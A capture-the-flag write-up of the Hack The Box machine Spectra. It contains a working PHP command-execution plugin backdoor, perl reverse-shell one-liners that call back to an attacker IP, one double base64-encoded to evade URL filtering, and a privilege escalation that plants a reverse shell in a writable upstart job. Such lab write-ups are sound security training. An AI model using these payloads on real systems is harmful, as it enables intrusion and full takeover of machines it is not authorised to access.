---
title: "HTB: Spectra Writeup"
date: 2021-06-08T12:22:00-07:00
categories:
  - blog
  - writeup
  - htb
tags:
  - htb
  - htb easy
  - offsec
---

There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!

---

# Enumeration

I began this box with a standard `nmap` scan:

```bash
$ nmap -sC -sV -oA nmap/spectra 10.10.10.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 13:01 EDT
Nmap scan report for 10.10.10.229
Host is up (0.077s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
80/tcp   open  http             nginx 1.17.4
3306/tcp open  mysql            MySQL (unauthorized)
8081/tcp open  blackice-icecap?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.10 seconds
```

# Foothold

From the `nmap` enumeration, there were a few interesting ports, but checking out port `80` to begin with, that lead to a simple homepage which listed two linkes, one went to a Wordpress website and the second went to what appears to be a copy of it that allows directory listing. There was one interesting file in the directory, which was a copy of the `wp-config.php` file with a different extension, `wp-config.php.save`. Looking at that file, we have some potential MySQL credentials:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Credentials noted for future reference, if needed. Attempting to log into the MySQL DB just results in a failure that my IP is unauthorized.

Visiting the Wordpress site at `/main` reveals a working Wordpress installation with one post from an `administrator`. Visiting `wp-admin.php` prompts for a login, which successfully works using the database password from earlier

```
Username: administrator
Password: devteam01
```

The Admin panel doesn't appear to be able to modify theme files, so I resorted to uploading a malicious plugin. [See here for details on obtaining a reverse shell through WordPress](https://www.hackingarticles.in/wordpress-reverse-shell/). I crafted a WordPress plugin to allow command execution:

```bash
$ cat rshell.php
<?php

/**
 * Plugin Name: Wordpress Reverse Shell
 * Author: Me
 */

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
                                                                                                                                                                                                                                             
$ zip rshell.zip rshell.php          
updating: rshell.php (deflated 30%)
```

In WordPress admin, I selected Plugins -> Add New -> Browse -> Upload -> Activate. This allowed me to upload and activate this malicious WordPress plugin to obtain a backdoor. The backdoor is then uploaded at `http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php`.

With the backdoor uploaded, I can play with different command execution and determine information about the machine. I had issues using a standard `bash` reverse shell, so I resorted to using a `perl` reverse shell:

```
perl -e 'use Socket;$i="10.10.14.204";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

However, some of the values in that string (specifically the `&` character) will cause issues in a URL, so I base64 encoded the payload:

```
cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMjA0IjskcD05MDAwO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK
```

However, that payload contains a `+` character, which I suspect will also cause issues as it may get treated as a space. So I base64 encoded it again:

```
Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=
```

That looks better! So to execute this, we must base64 decode it twice and send that to bash.

```
Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s= | base64 -d | base64 -d | bash
```

Crafting this into a payload to our PHP backdoor we get:

```
http://10.10.10.229/main/wp-content/plugins/rshell/rshell.php?cmd=echo%20Y0dWeWJDQXRaU0FuZFhObElGTnZZMnRsZERza2FUMGlNVEF1TVRBdU1UUXVNakEwSWpza2NEMDVNREF3TzNOdlkydGxkQ2hUTEZCR1gwbE9SVlFzVTA5RFMxOVRWRkpGUVUwc1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLVHRwWmloamIyNXVaV04wS0ZNc2MyOWphMkZrWkhKZmFXNG9KSEFzYVc1bGRGOWhkRzl1S0NScEtTa3BLWHR2Y0dWdUtGTlVSRWxPTENJK0psTWlLVHR2Y0dWdUtGTlVSRTlWVkN3aVBpWlRJaWs3YjNCbGJpaFRWRVJGVWxJc0lqNG1VeUlwTzJWNFpXTW9JaTlpYVc0dmMyZ2dMV2tpS1R0OU95Y0s=%20|%20base64%20-d%20|%20base64%20-d%20|%20bash
```

And catching it with a netcat listener:

```
$ nc -lnvp 9000
```

Which receives a successful callback!

# Privesc

Now that we're logged in as the `nginx` user, we can begin enumeration. Running linpeas, it highlighted a few things including:

```
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
```

That's interesting! Trying that as the `root` user didn't work, but trying that as the `katie` user worked! We have a user SSH shell!

```
Username: katie
Password: SummerHereWeCome!!
```

Checking what `katie` can do, it looks like we have sudo permission to run a program:

```bash
$ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

The `/sbin/initctl` program appears to be for starting and stopping services which are located in the `/etc/init` directory. Looking in that directory there are a few interesting services:

```bash
$ ls -larth
total 768K
-rw-rw----  1 root developers  478 Jun 29  2020 test9.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test8.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test7.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test6.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test5.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test4.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test3.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test2.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test10.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test1.conf
-rw-rw----  1 root developers  478 Jun 29  2020 test.conf
...{snip}...
```

Interesting, the group `developers` has read/write access to these files, are we in that group?

```bash
$ groups
katie developers
```

Great! We can update these files! I then updated the `test1` file to add a reverse shell to it:

```bash
$ cat test1.conf
...{snip}...
pre-start script
    perl -e 'use Socket;$i="10.10.14.204";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script
...{snip}...
```

Starting this with the command:

```bash
$ sudo /sbin/initctl start test1
```

And catching the reverse shell:

```bash
$ nc -lnvp 9001
```

We successfully become root!
